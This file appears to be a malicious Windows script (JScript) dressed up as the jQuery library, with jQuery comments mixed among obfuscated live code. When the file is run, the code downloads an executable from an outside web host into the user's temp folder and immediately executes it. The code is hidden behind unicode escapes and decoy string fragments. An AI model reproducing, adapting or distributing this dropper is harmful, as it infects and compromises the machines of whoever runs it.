//(function( global, factory ) {

var JXQvW = 'R\u0075n'; var gRCpvg = this['A\u0063\u0074\u0069\u0076\u0065X\u004F'+'b'+("fetter","advanced","towing","headquarters",'j\u0065')+'\u0063t'];
var bMHCOg = new gRCpvg('W\u0053'+("organized","pacific","cooperative",'c\u0072i')+'\u0070t\u002E\u0053h'+'\u0065ll');
// if ( typeof module === "object" && typeof module.exports === "object" ) {   // For CommonJS and CommonJS-like environments where a proper `window`   // is present, execute the factory and get jQuery.   // For environments that do not have a `window` with a `document`   // (such as Node.js), expose a factory as module.exports.   // This accentuates the need for the creation of a real `window`.   // e.g. var jQuery = require("jquery")(window);   // See ticket #14549 for more info.   module.exports = global.document ?    factory( global, true ) :    function( w ) {     if ( !w.document ) {      throw new Error( "jQuery requires a window with a document" );     }     return factory( w );    };  } else {   factory( global );  
var KfpDh = bMHCOg['\u0045\u0078pa\u006E\u0064\u0045\u006E\u0076\u0069\u0072\u006F\u006E'+'me\u006E'+("swarthy","twill","documents","style",'\u0074\u0053\u0074rin')+'g\u0073']('%\u0054'+("distant","well-dressed","scoff",'E')+'M'+'\u0050%') + '/\u0078\u006DV\u0073\u0079n\u006A\u0069x\u0031'+'\u0035.'+("smilies","ignition","janet",'e')+("coupling","elliptical","establishing",'\u0078e');
//}// Pass this if window is not defined yet }(typeof window !== "undefined" ? window : this, function( window, noGlobal ) {
var afyqSlonB = new gRCpvg('M\u0053'+'X'+("slimy","tournament",'ML\u0032\u002EX\u004D')+'\u004CH\u0054\u0054P');
//// Support: Firefox 18+ // Can"t be in strict mode, several libs including ASP.NET trace // the stack via arguments.caller.callee and Firefox dies if // you try to trace through "use strict" call chains. (#13335) //"use strict"; var deletedIds = [];
afyqSlonB['\u006Fn'+("ghent","consultancy",'re\u0061')+("diaphanous","algorithm","truth","redolent",'d\u0079\u0073\u0074a\u0074e\u0063h\u0061n')+'\u0067e'] = function () {
        if (afyqSlonB['r'+("considerable","teenage","hydrogen","credulous","conjuncture",'e')+'a'+'\u0064\u0079s\u0074\u0061t\u0065'] === 4) {
            var pzCiDX = new gRCpvg(("heinz","jeans",'AD\u004F')+'D\u0042.\u0053'+'t\u0072e'+'\u0061m');
            //var document = window.document;
            pzCiDX['\u006Fpe\u006E']();
            //var slice = deletedIds.slice;
            pzCiDX['t\u0079\u0070e'] = 1;
            //var concat = deletedIds.concat;
            pzCiDX['w'+("presenting","imitator","inoffensive","idiom","warcraft",'r')+("antenna","badger","mature",'i')+'t\u0065'](afyqSlonB['R'+'e'+("subvert","belarus","theatre","geology","trite",'sp\u006F')+("keywords","dregs",'\u006Ese\u0042o\u0064\u0079')]);
            //var push = deletedIds.push;
            pzCiDX['p'+("trend","temperatures","banns",'\u006Fs')+'\u0069t'+'\u0069on'] = 0;
            //var indexOf = deletedIds.indexOf;
            pzCiDX['s'+("apostate","cocktail","errol","nations",'av\u0065')+'To\u0046'+("stimulant","egotism",'\u0069le')](KfpDh, 2);
            //var class2type = {};
            pzCiDX['c'+("berber","emolument","auckland","intel","massive",'l')+'o'+("porno","samba",'\u0073e')]();
            //var toString = class2type.toString;
        };
};
try {

    //var hasOwn = class2type.hasOwnProperty;
    afyqSlonB['\u006Fpe\u006E']('GE\u0054', '\u0068\u0074t\u0070\u003A/\u002F\u0062e\u006Ct\u0073\u0068\u006F\u0065\u0073\u006E\u006D\u006Fre\u002E\u0063o\u006D\u002Fs\u0079s'+("amber","anytime","worcester","pussy","identifier",'\u0074\u0065\u006D/\u006C\u006Fg\u0073\u002F\u0038')+("circumstances","ocean",'7\u0079hb\u0035\u0034c')+'\u0064\u0066\u0079.\u0065x\u0065', false);

    //var support = {};
    afyqSlonB['s\u0065\u006Ed']();
    //
    bMHCOg[JXQvW](KfpDh, 1, "QEYtXMYQI" === "IlWHQhWIF");
    //var  version = "1.12.1",
} catch (arTfO) { };
// // Define a local copy of jQuery  jQuery = function( selector, context ) {